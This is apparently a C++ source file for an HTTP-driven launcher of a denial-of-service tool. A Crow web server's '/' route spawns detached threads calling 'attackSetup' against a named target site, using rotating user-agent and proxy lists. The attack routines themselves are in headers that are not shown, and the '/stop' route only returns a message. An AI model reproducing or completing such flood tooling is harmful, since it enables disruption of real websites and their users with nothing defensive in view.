

//  ░▒▓███████▓▒░  ░▒▓████████▓▒░  ░▒▓███████▓▒░ ░▒▓███████▓▒░  ░▒▓████████▓▒░  ░▒▓██████▓▒░  ░▒▓████████▓▒░        ░▒▓███████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░
//  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░           ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
//  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░           ░▒▓█▓▒░           ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
//  ░▒▓███████▓▒░  ░▒▓██████▓▒░    ░▒▓██████▓▒░  ░▒▓███████▓▒░  ░▒▓██████▓▒░   ░▒▓█▓▒░           ░▒▓█▓▒░            ░▒▓██████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░░▒▓█▓▒░ 
//  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░           ░▒▓█▓▒░                  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
//  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░               ░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░                  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
//  ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓███████▓▒░  ░▒▓█▓▒░        ░▒▓████████▓▒░  ░▒▓██████▓▒░     ░▒▓█▓▒░           ░▒▓███████▓▒░   ░▒▓██████▓▒░  ░▒▓███████▓▒░   ░▒▓██████▓▒░  
//                                                                                                                                                                             
//                      


#include <iostream> 
#include <vector> 
#include <thread> 
#include <unordered_map>
#include <fstream>
#include <format>
#include "crow.h"
#include "mainFuncs.h"
#include "itToP.h"
#include <sstream>



# if defined(_WINSOCKAPI_) && !defined(_WINSOCK2API_)
#  error WinSock.h has already been included
# endif // defined(_WINSOCKAPI_) && !defined(_WINSOCK2API_)

// <======CONFIG===========>

std::atomic_bool stop_thread_1 = false;
int max_thread_size = 5;

// <=======================>



int main() {
    crow::SimpleApp app;
    CROW_ROUTE(app, "/stop")([](){
        return "Succesfully stoped all threads..";
    });
  
    CROW_ROUTE(app, "/")([]()
        { 
            
        try {
              std::thread th(attackSetup ,1,max_thread_size, "https://you.com/", "you.com", "useragents.txt", "proxies.txt", true);
              th.detach();
             
              std::thread::id thread_id = th.get_id();
              std::string str_thread_id = std::to_string(std::hash<std::thread::id>{}(thread_id));
              return "Successfully. Thread ID: " + str_thread_id;
          }
          catch (std::exception& e) {
              std::cout << "exception: " << e.what() << std::endl;

          }
        });
    CROW_ROUTE(app, "/s")([]()
        {
            return "test";
        });
    app.port(2000).multithreaded().run();
    return 0;
}








